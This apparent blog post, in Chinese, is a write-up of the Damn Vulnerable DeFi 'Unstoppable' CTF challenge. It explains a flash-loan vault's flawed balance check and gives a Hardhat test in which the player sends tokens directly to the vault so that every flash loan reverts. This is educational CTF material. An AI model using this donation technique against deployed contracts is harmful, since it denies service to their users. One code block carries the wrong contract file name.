---
title: Damn vulnerable defi Challenge1 unstoppable
date: 2023-02-16 19:02:31
tags:
  - solidity
  - damnvulnerabledefi
  - defi
  - CTFs
categories:
  - solidity
thumbnail: /images/thumbs/unstoppable.png
---

![alt ""](/images/thumbs/unstoppable.png)

## Damn vulnerable defi CTFs 挑战 1.Unstoppable 详解

Damn vulnerable defi 是学习以太坊智能合约攻防的网站。具有闪贷、价格预言机、NFT、DEX、lending pool,智能合约钱包、和时间锁等特性。

### 如何开始

- 1. git clone [github repo](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0)
- 2. 通过 yarn 安装
- 3. 在\*.challenge.js 中填写编码
- 4. 通过 hardhat 工具运行 test 脚本文件

### 挑战内容

需要通过交互使得闪贷合约停止工作

### Unstoppable 内容

Unstoppable 合约中主要有 3 部分内容组成:

- ERC20 token 合约 (DamnValuableToken.sol)
- Unstoppable 主合约(UnstoppableVault.Sol)
- 调用闪贷合约的调用合约(ReceiverUnstoppable.sol)

这里还需要用到 hardhat 的 test 合约功能,如果对这部分内容不是很了解的话可以先阅读下 hardhat 的相关文档[Testing contracts](https://hardhat.org/hardhat-runner/docs/guides/test-contracts)。
相关的命令行:

```shell
npx hardhat test TEST_FILE_ROUTER
```

这里和运行部署脚本有区别的地方是没有 run 命令需要注意下。

### 合约流程

合约的测试脚本中(unstoppable.challenge.js)包含了 3 个用户分别是部署者、发起攻击的用户、普通的调用闪贷的用户。同时也包含了 3 个合约分别是 token 合约、闪贷合约、普通调用闪贷业务的用户合约。

```javascript
unstoppable.challenge.js

//部署者、发起攻击的用户、普通的调用闪贷的用户
let deployer, player, someUser;
//token 合约、闪贷合约、普通调用闪贷业务的用户合约
let token, vault, receiverContract;
...
```

当 token 合约和闪贷合约部署完成之后，像闪贷合约的部署地址支付了固定数量的 token。

```javascript
await token.approve(vault.address, TOKENS_IN_VAULT);
await vault.deposit(TOKENS_IN_VAULT, deployer.address);
```

最后部署普通用户的合约，通过用户合约像借贷合约发起了一笔借贷的请求。用户部署的合约收到请求之后调用了借贷合约的 flashLoan 方法，在借贷合约中 flashLoan 会回调用户合约中的 onFlashLoan 方法。在回调完成之后需要像用户收回之前发出去的借贷 token 并按照条件收取一定的费用 fee。

### 代码问题点

```javascript
ReceiverUnstoppable.sol
/**
  * @inheritdoc IERC3156FlashLender
  */
function flashLoan(
    IERC3156FlashBorrower receiver,
    address _token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    if (amount == 0) revert InvalidAmount(0); // fail early
    if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
    uint256 balanceBefore = totalAssets();
    //问题代码的位置.
    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
    uint256 fee = flashFee(_token, amount);
    // transfer tokens out + execute callback on receiver
    ERC20(_token).safeTransfer(address(receiver), amount);
    // callback must return magic value, otherwise assume it failed
    if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))
        revert CallbackFailed();
    // pull amount + fee from receiver, then pay the fee to the recipient
    ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
    ERC20(_token).safeTransfer(feeRecipient, fee);
    return true;
}
```

balanceBefore 在代码中表示部署的合约地址中所包含的 token 数量，而 totalSupply 只有在 mint 的时候才会累加，具体的代码在：

```javascript
ERC20.sol
function _mint(address to, uint256 amount) internal virtual {
    totalSupply += amount;

    // Cannot overflow because the sum of all user
    // balances can't exceed the max uint256 value.
    unchecked {
        balanceOf[to] += amount;
    }

    emit Transfer(address(0), to, amount);
}
```

所以只需要让这 2 个值不相等的话请求就会 revert,通过分析我们利用 player 像合约直接发送一笔 token

### 解决方式

```javascript
it("Execution", async function () {
  /** CODE YOUR SOLUTION HERE */
  await token
    .connect(player)
    .approve(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
  await token
    .connect(player)
    .transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
});
```
